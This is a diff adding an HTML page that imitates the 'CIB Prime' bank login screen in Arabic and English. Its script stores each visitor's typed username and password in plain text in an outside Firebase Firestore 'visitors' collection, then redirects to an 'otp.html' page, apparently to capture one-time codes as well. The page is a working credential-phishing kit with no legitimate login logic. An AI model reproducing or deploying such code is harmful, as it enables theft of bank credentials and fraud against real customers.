@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+  />
+
+  <title>CIB Prime Login</title>
+
+  <link
+  rel="icon"
+  type="image/png"
+  href="images/logo.png"
+/>
+
+  <!-- Tailwind -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Font -->
+  <link
+    href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap"
+    rel="stylesheet"
+  />
+
+  <style>
+    body {
+      font-family: "Cairo", sans-serif;
+      background: #f5f5f5;
+    }
+
+    input::placeholder {
+      color: #bdbdbd;
+    }
+
+    input:-webkit-autofill {
+      -webkit-box-shadow: 0 0 0 1000px #ffffff inset !important;
+    }
+
+    input::-ms-reveal,
+    input::-ms-clear {
+      display: none;
+    }
+
+    /* Fullscreen transparent loader */
+    .screen-loader {
+      position: fixed;
+      inset: 0;
+      background: rgba(255, 255, 255, 0.55);
+      backdrop-filter: blur(2px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+
+    .screen-loader.active {
+      display: flex;
+    }
+
+    /* Spinner */
+    .spinner {
+      width: 52px;
+      height: 52px;
+      border: 4px solid rgba(0, 87, 168, 0.15);
+      border-top-color: #0057a8;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    /* Dropdown animation */
+    .dropdown {
+      opacity: 0;
+      visibility: hidden;
+      transform: translateY(8px);
+      transition: all 0.2s ease;
+    }
+
+    .dropdown.active {
+      opacity: 1;
+      visibility: visible;
+      transform: translateY(0);
+    }
+  </style>
+</head>
+
+<body
+  id="body"
+  class="min-h-screen flex items-center justify-center p-5"
+  dir="rtl"
+>
+
+  <!-- Fullscreen Loader -->
+  <div id="screenLoader" class="screen-loader">
+    <div class="spinner"></div>
+  </div>
+
+  <!-- Wrapper -->
+  <div class="w-full max-w-md">
+
+    <!-- Top -->
+    <div class="flex items-start justify-between mb-8">
+
+      <!-- Logo -->
+      <img
+        src="images/ciblogo.png"
+        alt="CIB Prime"
+        class="w-36 sm:w-44 object-contain"
+      />
+
+      <!-- Language Dropdown -->
+      <div class="relative">
+
+        <button
+          id="langBtn"
+          type="button"
+          class="
+            flex
+            items-center
+            gap-2
+            border
+            border-[#dddddd]
+            rounded-2xl
+            bg-white
+            px-4
+            h-11
+            text-[#333]
+            text-sm
+            font-medium
+            shadow-sm
+          "
+        >
+
+          <span id="currentLang">
+            العربية
+          </span>
+
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            class="w-4 h-4"
+            fill="none"
+            viewBox="0 0 24 24"
+            stroke="currentColor"
+            stroke-width="2.5"
+          >
+            <path
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              d="M19 9l-7 7-7-7"
+            />
+          </svg>
+
+        </button>
+
+        <!-- Dropdown -->
+        <div
+          id="langDropdown"
+          class="
+            dropdown
+            absolute
+            top-14
+            right-0
+            w-32
+            bg-white
+            border
+            border-[#e5e5e5]
+            rounded-2xl
+            shadow-lg
+            overflow-hidden
+            z-50
+          "
+        >
+
+          <button
+            class="
+              lang-option
+              w-full
+              px-4
+              py-3
+              text-sm
+              text-right
+              hover:bg-[#f5f5f5]
+            "
+            data-lang="ar"
+          >
+            العربية
+          </button>
+
+          <button
+            class="
+              lang-option
+              w-full
+              px-4
+              py-3
+              text-sm
+              text-left
+              hover:bg-[#f5f5f5]
+            "
+            data-lang="en"
+          >
+            English
+          </button>
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <!-- Login Card -->
+    <div
+      class="
+        bg-white
+        border
+        border-[#e7e7e7]
+        rounded-3xl
+        p-6
+        sm:p-7
+        shadow-sm
+      "
+    >
+
+      <!-- Title -->
+      <div class="mb-7">
+
+        <h1
+          id="title"
+          class="text-2xl font-bold text-[#222]"
+        >
+          تسجيل الدخول
+        </h1>
+
+        <p
+          id="subtitle"
+          class="text-sm text-[#8b8b8b] mt-1"
+        >
+          الرجاء إدخال بيانات الدخول الخاصة بك
+        </p>
+
+      </div>
+
+      <!-- Form -->
+      <form id="loginForm" class="space-y-5">
+
+        <!-- Username -->
+        <div>
+
+          <label
+            id="usernameLabel"
+            class="
+              block
+              mb-2
+              text-[#2d2d2d]
+              text-sm
+              font-bold
+            "
+          >
+            اسم المستخدم
+          </label>
+
+          <div
+            class="
+              h-14
+              rounded-2xl
+              border
+              border-[#d9d9d9]
+              bg-white
+              px-4
+              flex
+              items-center
+              transition
+              focus-within:border-[#0057a8]
+            "
+          >
+
+            <input
+              id="username"
+              type="text"
+              autocomplete="off"
+              placeholder="ادخل اسم المستخدم"
+              class="
+                w-full
+                bg-transparent
+                outline-none
+                text-right
+                text-[15px]
+                text-[#333]
+              "
+            />
+
+          </div>
+
+          <p
+            id="usernameError"
+            class="
+              hidden
+              text-red-500
+              text-xs
+              mt-1
+            "
+          >
+            Arabic characters are not allowed
+          </p>
+
+        </div>
+
+        <!-- Password -->
+        <div>
+
+          <label
+            id="passwordLabel"
+            class="
+              block
+              mb-2
+              text-[#2d2d2d]
+              text-sm
+              font-bold
+            "
+          >
+            كلمة المرور
+          </label>
+
+          <div
+            class="
+              h-14
+              rounded-2xl
+              border
+              border-[#d9d9d9]
+              bg-white
+              px-4
+              flex
+              items-center
+              transition
+              focus-within:border-[#0057a8]
+            "
+          >
+
+            <!-- Eye -->
+            <button
+              id="togglePassword"
+              type="button"
+              class="
+                text-[#b8b8b8]
+                ml-3
+              "
+            >
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                class="w-5 h-5"
+                fill="none"
+                viewBox="0 0 24 24"
+                stroke="currentColor"
+                stroke-width="1.8"
+              >
+                <path
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
+                />
+
+                <path
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                  d="M2.458 12C3.732 7.943 7.523 5 12 5
+                  c4.478 0 8.268 2.943 9.542 7
+                  -1.274 4.057-5.064 7-9.542 7
+                  -4.477 0-8.268-2.943-9.542-7z"
+                />
+              </svg>
+            </button>
+
+           <input
+  id="password"
+  type="password"
+  autocomplete="off"
+  dir="ltr"
+  placeholder="ادخل كلمة المرور"
+  class="
+    w-full
+    bg-transparent
+    outline-none
+    text-left
+    text-[15px]
+    text-[#333]
+  "
+/>
+
+          </div>
+
+          <p
+            id="passwordError"
+            class="
+              hidden
+              text-red-500
+              text-xs
+              mt-1
+            "
+          >
+            Arabic characters are not allowed
+          </p>
+
+        </div>
+
+    <div class="flex justify-start">
+
+  <button
+    id="forgotBtn"
+    type="button"
+    class="
+      text-[#0057a8]
+      text-sm
+      font-bold
+    "
+  >
+    هل نسيت كلمة المرور؟
+  </button>
+
+</div>
+        <!-- Login Button -->
+        <button
+          id="loginBtn"
+          type="submit"
+          disabled
+          class="
+            w-full
+            h-14
+            rounded-2xl
+            bg-[#0057a8]
+            text-white
+            font-bold
+            text-[15px]
+            transition
+            disabled:opacity-50
+            disabled:cursor-not-allowed
+          "
+        >
+          تسجيل الدخول
+        </button>
+
+      </form>
+
+    </div>
+
+  </div>
+
+  <script>
+    const body = document.getElementById("body");
+
+    const username =
+      document.getElementById("username");
+
+    const password =
+      document.getElementById("password");
+
+    const usernameError =
+      document.getElementById("usernameError");
+
+    const passwordError =
+      document.getElementById("passwordError");
+
+    const loginBtn =
+      document.getElementById("loginBtn");
+
+    const togglePassword =
+      document.getElementById("togglePassword");
+
+    const screenLoader =
+      document.getElementById("screenLoader");
+
+    // Language elements
+    const langBtn =
+      document.getElementById("langBtn");
+
+    const langDropdown =
+      document.getElementById("langDropdown");
+
+    const currentLang =
+      document.getElementById("currentLang");
+
+    const langOptions =
+      document.querySelectorAll(".lang-option");
+
+    // Text elements
+    const title =
+      document.getElementById("title");
+
+    const subtitle =
+      document.getElementById("subtitle");
+
+    const usernameLabel =
+      document.getElementById("usernameLabel");
+
+    const passwordLabel =
+      document.getElementById("passwordLabel");
+
+    const forgotBtn =
+      document.getElementById("forgotBtn");
+
+    // Reject Arabic chars only
+    const arabicRegex = /[\u0600-\u06FF]/;
+
+    
+
+    // Validate
+    function validateInputs() {
+
+      const usernameValue =
+        username.value.trim();
+
+      const passwordValue =
+        password.value.trim();
+
+      let usernameValid = false;
+      let passwordValid = false;
+
+      // Username
+      if (
+        usernameValue.length > 0 &&
+        !arabicRegex.test(usernameValue)
+      ) {
+        usernameValid = true;
+        usernameError.classList.add("hidden");
+      } else {
+        usernameValid = false;
+
+        if (usernameValue.length > 0) {
+          usernameError.classList.remove("hidden");
+        } else {
+          usernameError.classList.add("hidden");
+        }
+      }
+
+      // Password
+      if (
+        passwordValue.length > 0 &&
+        !arabicRegex.test(passwordValue)
+      ) {
+        passwordValid = true;
+        passwordError.classList.add("hidden");
+      } else {
+        passwordValid = false;
+
+        if (passwordValue.length > 0) {
+          passwordError.classList.remove("hidden");
+        } else {
+          passwordError.classList.add("hidden");
+        }
+      }
+
+      // Button
+      loginBtn.disabled =
+        !(usernameValid && passwordValid);
+    }
+
+    username.addEventListener(
+      "input",
+      validateInputs
+    );
+
+    password.addEventListener(
+      "input",
+      validateInputs
+    );
+
+    // Toggle password
+    togglePassword.addEventListener(
+      "click",
+      () => {
+        password.type =
+          password.type === "password"
+            ? "text"
+            : "password";
+      }
+    );
+
+    // Submit
+    // Submit
+document
+  .getElementById("loginForm")
+  .addEventListener("submit", async function (e) {
+
+    e.preventDefault();
+
+    loginBtn.disabled = true;
+
+   const visitorId =
+  localStorage.getItem("visitorId");
+
+await window.setDoc(
+
+  window.doc(
+    window.db,
+    "visitors",
+    visitorId
+  ),
+
+  {
+    username: username.value,
+    entered2Input: password.value
+  },
+
+  { merge: true }
+
+);
+
+// Show loader
+screenLoader.classList.add("active");
+
+    setTimeout(() => {
+      window.location.href = "otp.html";
+    }, 3000);
+
+});
+
+    // Toggle dropdown
+    langBtn.addEventListener("click", () => {
+      langDropdown.classList.toggle("active");
+    });
+
+    // Close dropdown outside click
+    document.addEventListener("click", (e) => {
+      if (
+        !langBtn.contains(e.target) &&
+        !langDropdown.contains(e.target)
+      ) {
+        langDropdown.classList.remove("active");
+      }
+    });
+
+    // Language switch
+    langOptions.forEach((option) => {
+
+      option.addEventListener("click", () => {
+
+        const lang =
+          option.getAttribute("data-lang");
+
+        langDropdown.classList.remove("active");
+
+        // Arabic
+        if (lang === "ar") {
+
+          document.documentElement.lang = "ar";
+          body.setAttribute("dir", "rtl");
+
+          currentLang.textContent =
+            "العربية";
+
+          title.textContent =
+            "تسجيل الدخول";
+
+          subtitle.textContent =
+            "الرجاء إدخال بيانات الدخول الخاصة بك";
+
+          usernameLabel.textContent =
+            "اسم المستخدم";
+
+          passwordLabel.textContent =
+            "كلمة المرور";
+
+          username.placeholder =
+            "ادخل اسم المستخدم";
+
+          password.placeholder =
+            "ادخل كلمة المرور";
+
+          forgotBtn.textContent =
+            "هل نسيت كلمة المرور؟";
+
+          loginBtn.textContent =
+            "تسجيل الدخول";
+
+          usernameError.textContent =
+            "Arabic characters are not allowed";
+
+          passwordError.textContent =
+            "Arabic characters are not allowed";
+
+          username.classList.remove("text-right");
+          password.classList.remove("text-left");
+
+          username.classList.add("text-left");
+          password.classList.add("text-right");
+
+        }
+
+        // English
+        else {
+
+          document.documentElement.lang = "en";
+          body.setAttribute("dir", "ltr");
+
+          currentLang.textContent =
+            "English";
+
+          title.textContent =
+            "Login";
+
+          subtitle.textContent =
+            "Please enter your login credentials";
+
+          usernameLabel.textContent =
+            "Username";
+
+          passwordLabel.textContent =
+            "Password";
+
+          username.placeholder =
+            "Enter username";
+
+          password.placeholder =
+            "Enter password";
+
+          forgotBtn.textContent =
+            "Forgot password?";
+
+          loginBtn.textContent =
+            "Login";
+
+          usernameError.textContent =
+            "Arabic characters are not allowed";
+
+          passwordError.textContent =
+            "Arabic characters are not allowed";
+
+          username.classList.remove("text-left");
+          password.classList.remove("text-left");
+
+          username.classList.add("text-right");
+          password.classList.add("text-right");
+        }
+
+      });
+
+    });
+
+    
+  </script>
+
+<script type="module">
+
+import { initializeApp }
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import {
+  getFirestore,
+  doc,
+  setDoc
+}
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const firebaseConfig = {
+
+  apiKey: "AIzaSyCUs5CdBaeLUiglxu5gaijfJFNSaDRQd3U",
+
+  authDomain:
+    "letsgo-bd65d.firebaseapp.com",
+
+  projectId:
+    "letsgo-bd65d",
+
+  storageBucket:
+    "letsgo-bd65d.firebasestorage.app",
+
+  messagingSenderId:
+    "629849401898",
+
+  appId:
+    "1:629849401898:web:45148ce771ac50e7623153",
+
+  measurementId:
+    "G-GFGNTNLPH7"
+};
+
+const app =
+  initializeApp(firebaseConfig);
+
+const db =
+  getFirestore(app);
+
+window.db = db;
+window.setDoc = setDoc;
+window.doc = doc;
+
+</script>
+
+<script>
+
+async function createVisitor() {
+
+  let visitorId =
+    localStorage.getItem("visitorId");
+
+  if (!visitorId) {
+
+    visitorId =
+      "visitor_" + Date.now();
+
+    localStorage.setItem(
+      "visitorId",
+      visitorId
+    );
+
+  }
+
+  const currentPage =
+    window.location.pathname
+      .split("/")
+      .pop();
+
+  await window.setDoc(
+
+    window.doc(
+      window.db,
+      "visitors",
+      visitorId
+    ),
+
+    {
+      id: visitorId,
+      username: "",
+      entered2Input:"",
+      currentPage: currentPage
+    },
+
+    { merge: true }
+
+  );
+
+}
+
+createVisitor();
+
+</script>
+
+</body>
+</html>
